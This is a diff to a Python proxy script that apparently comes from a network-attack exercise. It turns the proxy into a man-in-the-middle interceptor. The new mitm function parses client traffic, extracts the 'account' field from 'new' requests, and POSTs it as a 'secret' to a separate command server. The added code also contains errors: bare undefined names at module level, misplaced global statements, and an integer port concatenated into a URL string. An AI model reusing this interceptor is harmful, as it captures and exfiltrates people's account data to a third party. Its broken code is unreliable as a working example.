@@ -6,6 +6,7 @@ import threading
 import signal
 import sys
 import json
+import requests
 from contextlib import contextmanager
 
 running = True
@@ -14,25 +15,22 @@ verbose = True
 CLIENT2SERVER = 1
 SERVER2CLIENT = 2
 
-success_message = None
-ack_message = None
+counter = 0
+
+command_server_ip
+command_server_port
 
 def mitm(buff, direction):
-    global success_message
-    global ack_message
-    hb = buff
+    hb = buff 
     if direction == CLIENT2SERVER:
-        if success_message!=None and ack_message==None:
-            ack_message = hb
+        request = json.loads(hb)
+        if request['mode'] == 'new':
+            account = request['account'] 
+            sendLearnedAccountName(account)
+            sendDoneRequest()
     elif direction == SERVER2CLIENT:
-        if success_message==None:
-            success_message = hb
-    if success_message!=None and direction==SERVER2CLIENT:
-        return success_message
-    else:
-        return hb
-
-
+        pass
+    
 @contextmanager
 def ignored(*exceptions):
     try:
@@ -107,9 +105,21 @@ def doProxyMain(port, remotehost, remoteport):
     return
 
 
+def sendDoneRequest():
+    url = "http://"+command_server_ip + ":" + command_server_port
+    payload = {"REQUEST":{"type":"done"}}
+    headers = {'content-type': 'application/json'}
+    response = requests.post(url, data=json.dumps(payload), headers=headers)
+
+
+def sendLearnedAccountName(account):
+    url = "http://"+command_server_ip + ":" + command_server_port
+    payload = {"REQUEST":{"type":"learned","variable":"account","secret":account}}
+    headers = {'content-type': 'application/json'}
+    response = requests.post(url, data=json.dumps(payload), headers=headers)
+
+
 if __name__ == '__main__':
-    global ackMessage
-    global successMessage
     parser = argparse.ArgumentParser(description='Proxy')
     parser.add_argument('-p', type=int, default=4000, help="listen port")
     parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
@@ -117,6 +127,11 @@ if __name__ == '__main__':
     parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
     parser.add_argument('-d', type=int, default=5000, help="command port")
     args = parser.parse_args()
+    global command_server_port
+    global command_server_ip
+    command_server_ip = args.c
+    command_server_port = args.d
+
     print('started\n')
     sys.stdout.flush()
     doProxyMain(args.p, args.s, args.q)
